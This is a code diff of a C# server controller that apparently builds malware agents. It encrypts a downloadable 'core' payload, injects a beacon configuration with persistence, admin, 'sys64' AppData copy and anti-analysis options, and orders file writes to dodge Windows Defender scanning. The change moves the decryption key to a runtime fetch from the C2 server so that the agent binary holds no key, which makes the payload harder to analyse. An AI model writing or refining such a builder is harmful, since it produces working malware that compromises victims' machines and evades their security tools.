@@ -526,16 +526,13 @@ public class BuilderController : ControllerBase
             await System.IO.File.WriteAllBytesAsync(coreBinPath, encryptedCore);
             job.Log($"Encrypted core saved: {encryptedCore.Length / 1024} KB");
 
-            // Generate RSA-2048 keypair
-            using var rsa = RSA.Create(2048);
-            var rsaPublicKey = Convert.ToBase64String(rsa.ExportSubjectPublicKeyInfo());
-            var rsaPrivateKey = Convert.ToBase64String(rsa.ExportPkcs8PrivateKey());
-
-            // RSA-OAEP encrypt the AES key
-            var encryptedAesKey = rsa.Encrypt(aesKey, RSAEncryptionPadding.OaepSHA256);
-            var encryptedAesKeyB64 = Convert.ToBase64String(encryptedAesKey);
-
-            job.Log("AES key generated, RSA keypair created, AES key encrypted");
+            // The AES key is kept server-side (written next to the build output).
+            // The loader negotiates it at runtime via /api/beacon/core-key, so no
+            // RSA private key is embedded in the agent binary.
+            var finalDir = Path.Combine(OutputBase, buildId);
+            Directory.CreateDirectory(finalDir);
+            await System.IO.File.WriteAllBytesAsync(Path.Combine(finalDir, "core.key"), aesKey);
+            job.Log("Core AES key written server-side");
 
             // ══════════════════════════════════════════════════════════════
             // Stage 3: Get Loader (from template or build fresh)
@@ -649,9 +646,8 @@ public class BuilderController : ControllerBase
                 require_admin = req.RequireAdmin,
                 copy_to_path = req.CopyToAppData ? "sys64" : null,
                 enable_persistence = req.EnablePersistence,
-                encrypted_aes_key = encryptedAesKeyB64,
                 core_download_path = $"/api/beacon/core/{buildId}",
-                rsa_private_key = rsaPrivateKey,
+                core_key_path = "/api/beacon/core-key",
                 beacon_secret = _beaconSettings.Secret,
                 anti_analysis = req.AntiAnalysis,
             };
@@ -671,10 +667,8 @@ public class BuilderController : ControllerBase
             job.Log($"Config injected: {configJson.Length} bytes");
 
             // ── Move to final output ──
-            var finalDir = Path.Combine(OutputBase, buildId);
             var finalPath = Path.Combine(finalDir, job.Record.FileName);
             var finalCorePath = Path.Combine(finalDir, "core.bin");
-            Directory.CreateDirectory(finalDir);
 
             // Write core.bin via system temp + move (avoids Defender directory scan lock)
             job.Log("Writing core.bin...");
